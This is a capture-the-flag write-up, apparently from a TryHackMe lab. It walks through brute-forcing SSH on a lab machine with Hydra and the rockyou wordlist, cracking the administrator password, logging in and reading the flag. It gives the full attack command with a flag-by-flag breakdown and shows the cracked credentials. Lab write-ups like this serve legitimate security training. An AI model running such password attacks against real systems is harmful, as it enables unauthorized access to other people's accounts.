### Details from the Enumeration stage

user = administrator
OS  = Ubuntu
SMTP = Postfix
IP = 10.10.225.121

**Hydra**

There is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub [here](https://github.com/vanhauser-thc/thc-hydra).

Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the "_/usr/share/wordlists_" directory- if you'd like to browse and find a different wordlists to the widely used "rockyou.txt". Likewise I recommend checking out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. E.g. subdomain enumeration  

The syntax for the command we're going to use to find the passwords is this:

```shell
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.225.121 ssh
```

Let's break it down:

  

**SECTION**

**FUNCTION**

hydra

Runs the hydra tool  

-t 16  

Number of parallel connections per target  

-l [user]

Points to the user who's account you're trying to compromise  

-P [path to dictionary]

Points to the file containing the list of possible passwords  

-vV  

Sets verbose mode to very verbose, shows the login+pass combination for each attempt

[machine IP]

The IP address of the target machine

ssh / protocol

Sets the protocol

------
1. Found that the password list was not uncompressed so I uncompressed the rockyou.txt file
```shell
ls /usr/share/wordlists            
amass  dirbuster      fern-wifi  legion      nmap.lst        sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt.gz  wfuzz
                                                                                                                    
┌──(root㉿kali)-[/home/kali/Documents/network_services2]
└─# gzip -dv  /usr/share/wordlists/rockyou.txt.gz 
/usr/share/wordlists/rockyou.txt.gz:     61.9% -- replaced with /usr/share/wordlists/rockyou.txt

```

2. Ran the hydra script, and got the password
```shell
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.225.121 ssh

[22][ssh] host: 10.10.225.121   login: administrator   password: alejandro

```
3. SSHed into the machine using the credentials and got the flag in the smtp.txt
```shell 

ssh administrator@10.10.225.121     

The authenticity of host '10.10.225.121 (10.10.225.121)' can't be established.
ED25519 key fingerprint is SHA256:6VV0TI4MQmKeRImOTQ8lj3uk863uVqWS+zh2fF2LLF8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.225.121' (ED25519) to the list of known hosts.
administrator@10.10.225.121's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)


Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
 ls
 
dead.letter  Maildir  smtp.txt

cat smtp.txt 
THM{who_knew_email_servers_were_c00l?}

```
